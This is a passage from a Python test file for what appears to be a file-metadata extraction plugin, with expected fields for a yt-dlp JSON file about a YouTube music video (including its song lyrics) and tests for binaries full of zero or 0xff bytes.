                                FV("137 - 1080x1080 (1080p)+140 - audio only (medium)", label="Format"),
                                FV("137+140", label="Format_id"),
                                FV("1632273", label="View_count"),
                                FV("1672774548", label="Epoch"),
                                FV("17", label="N_entries"),
                                FV("17", label="Playlist_count"),
                                FV("2", label="Audio_channels"),
                                FV("202.839", label="Tbr"),
                                FV("20210215", label="Upload_date"),
                                FV("2022.11.11", label="Tag_VersionVersion"),
                                FV("206", label="Duration"),
                                FV("24", label="Fps"),
                                FV("28340", label="Like_count"),
                                FV("293000", label="Channel_follower_count"),
                                FV("3:26", label="Duration_string"),
                                FV("4", label="Playlist_index"),
                                FV("44100", label="Asr"),
                                FV("5230403", label="Filesize_approx"),
                                FV("662", label="Comment_count"),
                                FV("73.341", label="Vbr"),
                                FV("8b64402", label="Tag_VersionRelease_Git_Head"),
                                FV("False", label="Is_live"),
                                FV("False", label="Was_live"),
                                FV("JSON", label="FileType"),
                                FV("Lund", label="Channel"),
                                FV("Lund", label="Playlist_uploader"),
                                FV("Lund", label="Uploader"),
                                FV("Lund - Reckless", label="Fulltitle"),
                                FV("Lund - Reckless", label="Title"),
                                FV("Lund - Videos", label="Playlist"),
                                FV("Lund - Videos", label="Playlist_title"),
                                FV("Music", label="Categories"),
                                FV(
                                    "Music & Lyrics written by: Lund\nProduced by: Lund\nMixing by: Lund\nMastering by: Lund\n\nLyrics:\nReckless\nStole my heart\nAnd put it on a necklace\nWind back the clock baby girl\ntime is precious\nNow I know that loving you\na death wish\nTell me how it feels to\ntake advantage of love\nRestless\nYour voice inside my head\nThe echo endless\nLet down my guard\nEvery time i regret it\nEven tho i know you were pretending\nwhen i said i loved you\nI meant it\nNumb inside\nphotos on the wall\nI can’t stand the sight\nCause everywhere I look\nI see you and I\nIt’s torture baby\nI don’t even feel alive\nI can’t even cry\nHole inside\nMy heart\nYou took advantage\nOf my trust Oh why’d\nyou have to ruin\nAll our memories\nI tried everything\nTo keep you by my side\nBut I can’t love a lie\ncome back\nQuit wasting time on love you know that won’t last\nWhen this hearts only for you\nI could show that\nin everything I do for you\nyou’d know that\nAll of me\nI’ll give to you\nWon’t hold back\nTrust in us\nOh I believe\nWe’ll grow that\nAnytime you need me\nI’ll be right there\nI been here before\nI know your scared\nyour heart im tryin repair\nCause I know that love is\nReckless\nStole my heart\nAnd put it on a necklace\nWind back the clock baby girl\ntime is precious\nNow I know that loving you\na death wish\nTell me how it feels to\ntake advantage of love\nRestless\nYour voice inside my head\nThe echo endless\nLet down my guard\nEvery time i regret it\nEven tho i know you were pretending\nwhen i said i loved you\nI meant it\nSilhouette of you\nPlayin on a loop in my head\nIt was all a ruse\nDidn’t mean a word that you said\nI gave you my heart\nyou wanted my soul instead\nThis an sos but no one here to save me\nI’m dead\nCaught up in a lie\nCan’t forget the words you said\nThe way you made me feel\nEven it’s all pretend\nPoison in my veins\nI can never trust again\nLook into my eyes\nI want you to see what you\nDid To me\ntried but I can’t erase all our history\nhaunts me everyday I live in misery\nWithout you I have nothing but our memories\nLife is like a puzzle\nYour the missing piece\nNow I’m so confused\nOn where I need to be\nSearching for the answer\nBut it’s plain to see\nWe weren’t meant to be\nBaby I’m just tryin figure out\nHow you could be so\nReckless\nStole my heart\nAnd put it on a necklace\nWind back the clock baby girl\ntime is precious\nNow I know that loving you\na death wish\nTell me how it feels to\ntake advantage of love\nRestless\nYour voice inside my head\nThe echo endless\nLet down my guard\nEvery time i regret it\nEven tho i know you were pretending\nwhen i said i loved you\nI meant it\n\nⓒ 2020 Lund, under exclusive license to Republic Records, a division \nof UMG Recordings, Inc.",
                                    label="Description",
                                ),
                                FV("SDR", label="Dynamic_range"),
                                FV("TFBwlyUbhVk", label="Display_id"),
                                FV("TFBwlyUbhVk", label="Id"),
                                FV("True", label="Playable_in_embed"),
                                FV("UCGNTefG5pdLxxNXOdna4bNQ", label="Channel_id"),
                                FV("UCGNTefG5pdLxxNXOdna4bNQ", label="Playlist_id"),
                                FV("UCGNTefG5pdLxxNXOdna4bNQ", label="Playlist_uploader_id"),
                                FV("UCGNTefG5pdLxxNXOdna4bNQ", label="Uploader_id"),
                                FV("Youtube", label="Extractor_key"),
                                FV("application/json", label="MIMEType"),
                                FV("avc1.640020", label="Vcodec"),
                                FV("http://www.youtube.com/channel/UCGNTefG5pdLxxNXOdna4bNQ", label="Uploader_url"),
                                FV("https+https", label="Protocol"),
                                FV("https://i.ytimg.com/vi_webp/TFBwlyUbhVk/maxresdefault.webp", label="Thumbnail"),
                                FV("https://www.youtube.com/channel/UCGNTefG5pdLxxNXOdna4bNQ", label="Channel_url"),
                                FV("https://www.youtube.com/watch?v=TFBwlyUbhVk", label="Webpage_url"),
                                FV("json", label="FileTypeExtension"),
                                FV("mp4", label="Ext"),
                                FV("mp4a.40.2", label="Acodec"),
                                FV("not_live", label="Live_status"),
                                FV("public", label="Availability"),
                                FV("video", label="Tag_type"),
                                FV("watch", label="Webpage_url_basename"),
                                FV("youtube", label="Extractor"),
                                FV("youtube.com", label="Webpage_url_domain"),
                                FV("yt-dlp/yt-dlp", label="Tag_VersionRepository"),
                            ],
                            "mime": [FV("application/json")],
                        },
                    )
                ],
            ),
        )

    def test_binary_full_of_zeros(self):
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "f42ac9f0d388a01081157fa77ee261a09b07c7b8284187e7d1fd477880b92c45",
                        "Benign file full of zero bytes.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED_WITH_ERRORS, message="Binary is full of zeros."),
                events=[
                    Event(
                        sha256="f42ac9f0d388a01081157fa77ee261a09b07c7b8284187e7d1fd477880b92c45",
                        features={"malformed": [FV("Binary is full of zeros.")]},
                    )
                ],
            ),
        )

    def test_binary_with_leading_zeros(self):
        """Test a binary that contains lots of leading zeros and can't be processed returns opt-out"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_cart(
                        "3d0bf46a71921f227d070527a8ba99a3051f3e7e4d2bc7b1a8b93af74088ab6b.cart",
                        description="file with lots of leading 0x00s.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(
                    State.Label.OPT_OUT,
                    message="First 1995 bytes of file is binary zeros",
                )
            ),
        )

    def test_binary_with_leading_0xffs(self):
        """Test a binary that contains lots of leading 0xff bytes and can't be processed returns opt-out"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_cart(
                        "2fba75753ae3d97d26ed975529d6aa6739b04c0450aec1f3a7e6cf46016e04c1.cart",
                        description="Text file with lots of leading 0xff's.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(
                    State.Label.OPT_OUT,
                    message="First 1860 bytes of file is binary 0xff's",
                )
            ),
        )
